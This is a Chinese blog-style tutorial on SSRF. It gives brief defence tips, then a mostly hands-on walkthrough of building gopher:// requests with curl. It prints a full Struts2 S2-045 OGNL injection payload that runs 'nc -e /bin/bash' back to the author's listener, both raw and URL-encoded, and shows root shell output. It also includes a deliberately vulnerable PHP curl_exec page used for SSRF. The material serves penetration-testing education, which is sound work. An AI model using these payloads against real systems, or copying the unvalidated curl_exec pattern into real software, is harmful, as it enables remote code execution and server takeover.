&lt;h1 id=&quot;ssrflou-dong-de-fang-yu&quot;&gt;SSRF漏洞的防御&lt;&#x2F;h1&gt;
&lt;ul&gt;
&lt;li&gt;禁止302跳转，或者没跳转一次都进行校验目的地址是否为内网地址或合法地址。&lt;&#x2F;li&gt;
&lt;li&gt;过滤返回信息，验证远程服务器对请求的返回结果，是否合法。&lt;&#x2F;li&gt;
&lt;li&gt;禁用高危协议，例如：gopher、dict、ftp、file等，只允许http&#x2F;https设置 URL白名单或者限制内网IP&lt;&#x2F;li&gt;
&lt;li&gt;限制请求的端口为http的常用端口，或者根据业务需要治开放远程调用服务的端口&lt;&#x2F;li&gt;
&lt;li&gt;catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h1 id=&quot;ssrflou-dong-de-ying-yong&quot;&gt;SSRF漏洞的应用&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;gopherxie-yi-de-ying-yong&quot;&gt;Gopher协议的应用&lt;&#x2F;h2&gt;
&lt;h3 id=&quot;shi-yao-shi-gopferxie-yi&quot;&gt;什么是Gopfer协议&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;strong&gt;定义&lt;&#x2F;strong&gt;：Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；&lt;br &#x2F;&gt;gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议&lt;br &#x2F;&gt;&lt;strong&gt;限制&lt;&#x2F;strong&gt;：gopher协议在各个编程语言中的使用限制&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624627608419-8e271cdc-b44f-4c77-9a38-4c2d1be9e29e.png#align=left&amp;amp;display=inline&amp;amp;height=162&amp;amp;id=uea6ec4c9&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=162&amp;amp;originWidth=1314&amp;amp;size=120269&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1314&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;--wite-curlwrappers：运用curl工具打开url流&lt;br &#x2F;&gt;curl使用curl --version查看版本以及支持的协议&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624627634358-b9c2abfd-87e9-4057-8ffb-1df453d8e949.png#align=left&amp;amp;display=inline&amp;amp;height=168&amp;amp;id=ud4bd65b6&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=168&amp;amp;originWidth=1132&amp;amp;size=252658&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1132&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;strong&gt;Gopher协议格式&lt;&#x2F;strong&gt;：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;URL:gopher:&#x2F;&#x2F;&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;&#x2F;&amp;lt;gopher-path&amp;gt;_后接TCP数据流
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;gopher的默认端口是70&lt;&#x2F;li&gt;
&lt;li&gt;如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;amp;也需要进行URL编码&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;&lt;strong&gt;Gopher发送请求HTTP GET请求：&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;使用Gopher协议发送一个请求，环境为：nc起一个监听，curl发送gopher请求&lt;br &#x2F;&gt;nc启动监听，监听2333端口：nc -lp 2333&lt;br &#x2F;&gt;使用curl发送http请求，命令为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ curl gopher:&#x2F;&#x2F;192.168.0.119:2333&#x2F;abcd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;此时nc收到的消息为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -lp&lt;&#x2F;span&gt;&lt;span&gt; 2333
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bcd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以发现url中的a没有被nc接受到，如果命令变为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ curl gopher:&#x2F;&#x2F;192.168.0.119:2333&#x2F;_abcd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;此时nc收到的消息为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -lp&lt;&#x2F;span&gt;&lt;span&gt; 2333
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;abcd
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;所以需要在使用gopher协议时在url后加入一个字符（该字符可随意写）&lt;br &#x2F;&gt;那么如何发送HTTP的请求呢？例如GET请求。此时我们联想到，直接发送一个原始的HTTP包不就可以吗？在gopher协议中发送HTTP的数据，需要以下三步：&lt;br &#x2F;&gt;1、构造HTTP数据包&lt;br &#x2F;&gt;2、URL编码、替换回车换行为%0d%0a&lt;br &#x2F;&gt;3、发送gopher协议&lt;&#x2F;p&gt;
&lt;p&gt;我准备了一个PHP的代码，如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Hello &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;.$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;].&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;一个GET型的HTTP包，如下：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;GET &#x2F;ssrf&#x2F;base&#x2F;get.php?name=Margin HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.0.109
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;URL编码后为：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_GET%20&#x2F;ssrf&#x2F;base&#x2F;get.php%3fname=Margin%20HTTP&#x2F;1.1%0d%0AHost:%20192.168.0.109%0d%0A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在转换为URL编码时候有这么几个坑：&lt;br &#x2F;&gt;1、问号（？）需要转码为URL编码，也就是%3f&lt;br &#x2F;&gt;2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a&lt;br &#x2F;&gt;3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Gopher发送请求HTTP POST请求：&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;发送POST请求前，先看下POST数据包的格式&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;host:192.168.0.109
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;name=Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;那我们将上面的POST数据包进行URL编码并改为gopher协议&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20&#x2F;ssrf&#x2F;base&#x2F;post.php%20HTTP&#x2F;1.1%0d%0AHost:192.168.0.1090d%0A%0d%0Aname=Margin%0d%0A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;post.php的代码为&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Hello &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;.$&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_POST&lt;&#x2F;span&gt;&lt;span&gt;[&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;].&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用curl发起gopher的POST请求后，结果为：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624628140442-97b1c6e7-7c2e-41f1-9a08-937dcb63a305.png#align=left&amp;amp;display=inline&amp;amp;height=820&amp;amp;id=u17f57e99&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=820&amp;amp;originWidth=2243&amp;amp;size=1400583&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2243&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;根据上图发现返回的包爆了501的错误，我的思路是这样的：查看Apache的正常日志和错误日志、查找POST请求中所需的字段。下面分别是正常日志和错误日志的截图：&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#2b303b;color:#c0c5ce;&quot;&gt;&lt;code&gt;&lt;span&gt;192.168.0.119 - - [07&#x2F;Mar&#x2F;2020:15:19:49 +0800] &amp;quot;POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1&amp;quot; 200 7
&lt;&#x2F;span&gt;&lt;span&gt;192.168.0.119 - - [07&#x2F;Mar&#x2F;2020:15:19:49 +0800] &amp;quot;name=Margin&amp;quot; 501 213
&lt;&#x2F;span&gt;&lt;span&gt;[Sat Mar 07 15:38:50 2020] [error] [client 192.168.0.119] Invalid method in request name=Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里有个疑问：为什么发起了2次请求？为什么会把参数name=Margin当作一个请求？这个地方我调试了很久，发现问题出现在POST请求头中，我之前发POST请求都是直接用脚本，但从来没考虑过哪些参数是POST请求必须的，经过排查，发现有4个参数为必要参数（四个参数的含义不再赘述）：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;POST &#x2F;ssrf&#x2F;base&#x2F;post.php HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;host:192.168.0.109
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type:application&#x2F;x-www-form-urlencoded
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length:11
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;name=Margin
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;现在我们将它进行URL编码：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;curl gopher:&#x2F;&#x2F;192.168.0.109:80&#x2F;_POST%20&#x2F;ssrf&#x2F;base&#x2F;post.php%20HTTP&#x2F;1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application&#x2F;x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;再次发送请求的结果为：&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624628323373-f064bad3-dbc3-4bb8-a987-6fb0848470c0.png#align=left&amp;amp;display=inline&amp;amp;height=510&amp;amp;id=u6318a58c&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=510&amp;amp;originWidth=2243&amp;amp;size=1021097&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2243&quot; alt=&quot;image.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;发现请求正常，OK，那我们现在就介绍完了gopher协议的GET和POST请求。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;ru-he-shi-yong-gopherxie-yi-fan-dan-shell-shen-tou-javade-struts2kuang-jia&quot;&gt;如何使用Gopher协议反弹shell（渗透Java的Struts2框架）&lt;&#x2F;h3&gt;
&lt;p&gt;Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架 (&lt;em&gt;&lt;strong&gt;摘自百度百科&lt;&#x2F;strong&gt;&lt;&#x2F;em&gt;)&lt;br &#x2F;&gt;今天我们用到的漏洞是Struts2-045漏洞，相信很多大佬不陌生，以下为S2-045漏洞反弹shell的利用代码，我们在本地机器上执行：nc -lp 6666&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;GET &#x2F;S2-045&#x2F; HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.0.119
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type:%{(#_=&amp;#39;multipart&#x2F;form-data&amp;#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&amp;#39;com.opensymphony.xwork2.ActionContext.container&amp;#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&amp;#39;nc -e &#x2F;bin&#x2F;bash 192.168.0.119 6666&amp;#39;).(#iswin=(@java.lang.System@getProperty(&amp;#39;os.name&amp;#39;).toLowerCase().contains(&amp;#39;win&amp;#39;))).(#cmds=(#iswin?{&amp;#39;cmd.exe&amp;#39;,&amp;#39;&#x2F;c&amp;#39;,#cmd}:{&amp;#39;&#x2F;bin&#x2F;bash&amp;#39;,&amp;#39;-c&amp;#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;我们将其变为gopher所能使用的请求&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;curl gopher:&#x2F;&#x2F;192.168.0.119:8080&#x2F;_GET%20&#x2F;S2-045&#x2F;%20HTTP&#x2F;1.1%0d%0aHost:192.168.0.119%0d%0aContent-Type:%25%7b%28%23%5f%3d%27%6d%75%6c%74%69%70%61%72%74%2f%66%6f%72%6d%2d%64%61%74%61%27%29%2e%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3f%28%23%5f%6d%65%6d%62%65%72%41%63%63%65%73%73%3d%23%64%6d%29%3a%28%28%23%63%6f%6e%74%61%69%6e%65%72%3d%23%63%6f%6e%74%65%78%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%3d%23%63%6f%6e%74%61%69%6e%65%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%67%6e%6c%55%74%69%6c%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%6f%6e%74%65%78%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%29%29%2e%28%23%63%6d%64%3d%27%6e%63%20%2d%65%20%2f%62%69%6e%2f%62%61%73%68%20%31%39%32%2e%31%36%38%2e%30%2e%31%31%39%20%36%36%36%36%27%29%2e%28%23%69%73%77%69%6e%3d%28%40%6a%61%76%61%2e%6c%61%6e%67%2e%53%79%73%74%65%6d%40%67%65%74%50%72%6f%70%65%72%74%79%28%27%6f%73%2e%6e%61%6d%65%27%29%2e%74%6f%4c%6f%77%65%72%43%61%73%65%28%29%2e%63%6f%6e%74%61%69%6e%73%28%27%77%69%6e%27%29%29%29%2e%28%23%63%6d%64%73%3d%28%23%69%73%77%69%6e%3f%7b%27%63%6d%64%2e%65%78%65%27%2c%27%2f%63%27%2c%23%63%6d%64%7d%3a%7b%27%2f%62%69%6e%2f%62%61%73%68%27%2c%27%2d%63%27%2c%23%63%6d%64%7d%29%29%2e%28%23%70%3d%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%23%63%6d%64%73%29%29%2e%28%23%70%2e%72%65%64%69%72%65%63%74%45%72%72%6f%72%53%74%72%65%61%6d%28%74%72%75%65%29%29%2e%28%23%70%72%6f%63%65%73%73%3d%23%70%2e%73%74%61%72%74%28%29%29%2e%28%23%72%6f%73%3d%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%73%74%72%75%74%73%32%2e%53%65%72%76%6c%65%74%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%40%67%65%74%52%65%73%70%6f%6e%73%65%28%29%2e%67%65%74%4f%75%74%70%75%74%53%74%72%65%61%6d%28%29%29%29%2e%28%40%6f%72%67%2e%61%70%61%63%68%65%2e%63%6f%6d%6d%6f%6e%73%2e%69%6f%2e%49%4f%55%74%69%6c%73%40%63%6f%70%79%28%23%70%72%6f%63%65%73%73%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%72%6f%73%29%29%2e%28%23%72%6f%73%2e%66%6c%75%73%68%28%29%29%7d%0d%0a
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;一定要注意最后加上%0d%0a，以及很多URL编码工具将会回车换行转码为%0a，一定要自己替换为%0a%0d&lt;br &#x2F;&gt;发送请求后可以反弹shell&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;margine:~&lt;&#x2F;span&gt;&lt;span&gt; margin$ nc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; -l&lt;&#x2F;span&gt;&lt;span&gt; 6666
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;id
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uid&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;) gid=0(root) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;groups&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;root&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;zai-ssrfzhong-ru-he-shi-yong-gopherxie-yi-fan-dan-shell&quot;&gt;在SSRF中如何使用gopher协议反弹shell&lt;&#x2F;h3&gt;
&lt;ol&gt;
&lt;li&gt;我们先准备了一个带有ssrf漏洞的页面，代码如下：&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;pre data-lang=&quot;php&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-php &quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span&gt;    $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url &lt;&#x2F;span&gt;&lt;span&gt;= $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_GET&lt;&#x2F;span&gt;&lt;span&gt;[&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;];
&lt;&#x2F;span&gt;&lt;span&gt;    $&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curlobj &lt;&#x2F;span&gt;&lt;span&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;curl_init&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;url&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;echo curl_exec&lt;&#x2F;span&gt;&lt;span&gt;($&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;curlobj&lt;&#x2F;span&gt;&lt;span&gt;);
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ab7967;&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;这里需要注意的是，&lt;strong&gt;你的PHP版本必须大于等于5.3&lt;&#x2F;strong&gt;，并且在PHP.ini文件中开启了extension=php_curl.dll&lt;br &#x2F;&gt;2. 我在机器上开启了一个监听nc -lp 6666&lt;br &#x2F;&gt;   然后在浏览器中访问：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;http&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-http &quot;&gt;&lt;code class=&quot;language-http&quot; data-lang=&quot;http&quot;&gt;&lt;span&gt;http:&#x2F;&#x2F;192.168.0.109&#x2F;ssrf&#x2F;base&#x2F;curl_exec.php?url=gopher:&#x2F;&#x2F;192.168.0.119:6666&#x2F;_abc
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以看到nc接收到了消息，没有问题。&lt;&#x2F;p&gt;
